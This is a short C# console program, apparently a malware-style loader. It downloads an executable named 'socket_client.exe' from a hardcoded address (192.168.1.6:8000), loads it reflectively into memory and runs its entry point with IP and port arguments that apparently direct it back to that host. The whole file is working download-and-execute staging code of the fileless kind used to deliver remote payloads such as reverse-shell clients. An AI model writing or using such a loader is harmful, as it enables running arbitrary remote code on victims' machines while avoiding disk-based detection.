using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;

namespace loader
{
    internal class Program
    {
        /*public void LoadFromFile(string filepath)
        {
            Assembly assembly = Assembly.LoadFile(filepath);
            string[] newargs = { };
            assembly.EntryPoint.Invoke(null, new object[] {newargs});
        }*/
        public void LoadFromUrl(string url)
        {
            WebClient wc = new WebClient();
            byte[] filecontent = wc.DownloadData(url);
            
            
            Assembly assembly = Assembly.Load(filecontent);
            string[] newargs = {"192.168.1.6","12345","192.168.1.6","8000" };
            assembly.EntryPoint.Invoke(null, new object[] { newargs });      
         
          
        }
        static void Main(string[] args)
        {
            Thread t = new Thread(() =>
            {
                Program p = new Program();
                //p.LoadFromFile(@"C:\Users\vipin\source\repos\messageboxdemo\messageboxdemo\bin\Debug\messageboxdemo.exe");
                p.LoadFromUrl(@"http://192.168.1.6:8000/socket_client.exe");
                

            });
            t.Start();
            t.Join();
            Console.WriteLine("Press anything to continue");
            Console.ReadKey();
        }
    }
}
